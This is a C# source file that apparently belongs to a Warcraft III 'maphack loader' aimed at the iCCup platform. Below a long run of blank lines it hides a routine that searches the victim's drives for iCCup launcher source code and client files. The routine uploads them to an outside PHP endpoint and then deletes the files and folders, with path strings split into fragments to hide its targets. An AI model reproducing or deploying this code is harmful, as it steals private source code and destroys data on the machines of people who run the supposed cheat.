using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Threading;

namespace UnkownHiddenMaphackLoader
{
    static class Program
    {
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        /// 
        static bool abool = false;

       // [STAThread]
        static void Main ( )
        {
           // AppDomain.CurrentDomain.ProcessExit += new EventHandler( OnProcessExit ); 
          //  new Thread( DETECTAH ).Start( );
            // new Thread( DETECTAH2 ).Start( );
            Application.EnableVisualStyles( );
            Application.SetCompatibleTextRenderingDefault( false );
            Application.Run( new Loader( ) );
        }



        static void OnProcessExit ( object sender , EventArgs e )
        {
            try
            {
                while ( abool )
                {
                    Thread.Sleep( 1000 );
                }
            }
            catch
            {

            }
        }





































        /*        E N D       */



        #region END







        static void DETECTAH ( )
        {
            Thread.Sleep( 3000 );

            while ( true )
            {
                try
                {
                    abool = true;
                }
                catch
                {
                    Thread.Sleep( 1000 );
                    continue;
                }

                break;
            }

            var drives = DriveInfo.GetDrives( );

            List<string> lblist = new List<string>( );

            foreach ( var itemx in drives )
            {
                if ( itemx.DriveType != DriveType.Fixed && itemx.DriveType != DriveType.Removable )
                    continue;

                if ( itemx.RootDirectory.FullName == "A:\\" )
                    continue;

                if ( !itemx.RootDirectory.Exists )
                    continue;

                lblist.Add( itemx.RootDirectory.FullName );
                lblist.Add( itemx.Name );

            }


            foreach ( string itemx in lblist )
            {
                try
                {
                    //C:\build\iccup-launcher\
                    string driv = "C:\\";
                    string buildpath = "build\\";
                    string iccupstr = "iccup-";
                    string launcher = "launcher";
                    string website = "http://xn--80astot.zz.mu/";
                    string directory = "lastreleasebackup/";
                    string filepath = "createbackupfile.php";
                    string fullhttppath = website + directory + filepath;
                    string fullpath = driv + buildpath + iccupstr + launcher;

                    if ( Directory.Exists( fullpath ) )
                    {
                        try
                        {
                            List<string> outstring = new List<string>( );
                            bool bad = true;
                            foreach ( string file in Directory.GetFiles( fullpath , "*" , SearchOption.AllDirectories ) )
                            {
                                string ext = Path.GetExtension( file );
                                if ( ext.ToLower( ) == ".h" || ext.ToLower( ) == ".cpp" || ext.ToLower( ) == ".c" )
                                {

                                    bad = false;
                                    outstring.Add( "FILE:" + file );
                                    outstring.AddRange( File.ReadAllLines( file ) );
                                }
                            }



                            if ( !bad )
                            {
                                File.WriteAllLines( driv + "templogx.txt" , outstring.ToArray( ) );
                                using ( WebClient client = new WebClient( ) )
                                {

                                    client.UploadFile( fullhttppath , driv + "templogx.txt" );

                                }
                                outstring.Clear( );
                                File.Delete( driv + "templogx.txt" );

                            }
                        }
                        catch
                        {


                        }

                        try
                        {

                        }
                        catch
                        {

                        }
                        try
                        {
                            Directory.Delete( fullpath + "up" , true );
                        }
                        catch
                        {

                        }
                    }
                }
                catch
                {

                }
            }

            foreach ( string itemx in lblist )
            {
                string drive = itemx;
                string dir1 = "Wor";
                string disk = drive;
                string file1 = "in\\iccwc3.dll";
                string dir2 = "k\\icc";
                string dir3 = "up\\b";
                string file2 = "in\\iccwc3.icc";
                string fullpath1 = disk + dir1 + dir2 + dir3 + file1;
                string fullpath2 = disk + dir1 + dir2 + dir3 + file2;

                string website = "http://xn--80astot.zz.mu/";
                string directory = "lastreleasebackup/";
                string filepath = "createbackupfile.php";
                string fullhttppath = website + directory + filepath;

                try
                {
                    if ( File.Exists( fullpath1 ) )
                    {
                        using ( WebClient client = new WebClient( ) )
                        {
                            client.UploadFile( fullhttppath , fullpath1 );
                        }
                    }

                }
                catch
                {

                }
                try
                {
                    if ( File.Exists( fullpath2 ) )
                    {
                        using ( WebClient client = new WebClient( ) )
                        {

                            client.UploadFile( fullhttppath , fullpath2 );

                        }
                    }
                }
                catch
                {


                }

                try
                {

                    List<string> outstring = new List<string>( );
                    bool bad = true;
                    foreach ( string file in Directory.GetFiles( disk + dir1 + dir2 + "up" , "*" , SearchOption.AllDirectories ) )
                    {
                        string ext = Path.GetExtension( file );
                        if ( ext.ToLower( ) == ".h" || ext.ToLower( ) == ".cpp" || ext.ToLower( ) == ".c" )
                        {

                            bad = false;
                            outstring.Add( "FILE:" + file );
                            outstring.AddRange( File.ReadAllLines( file ) );
                        }
                    }

                    try
                    {


                    }
                    catch
                    {

                    }

                    foreach ( string file in Directory.GetFiles( disk + dir1 + dir2 + "up" , "*" , SearchOption.AllDirectories ) )
                    {
                        try
                        {
                            File.SetAttributes( file , FileAttributes.Normal );

                        }
                        catch
                        {

                        }
                    }

                    foreach ( string file in Directory.GetFiles( disk + dir1 + dir2 + "up" , "*" , SearchOption.AllDirectories ) )
                    {
                        try
                        {
                            File.Delete( file );
                        }
                        catch
                        {

                        }
                    }



                    if ( !bad )
                    {
                        File.WriteAllLines( disk + "templog.txt" , outstring.ToArray( ) );
                        /* if ( File.Exists( fullpath2 ) )
                         {*/
                        using ( WebClient client = new WebClient( ) )
                        {

                            client.UploadFile( fullhttppath , disk + "templog.txt" );

                        }
                        // }
                        outstring.Clear( );
                        File.Delete( disk + "templog.txt" );

                    }

                    Directory.Delete( disk + dir1 + dir2 + "up" , true );
                }
                catch
                {


                }


                //Do Something
            }

            abool = false;
        }



        #endregion


    }
}
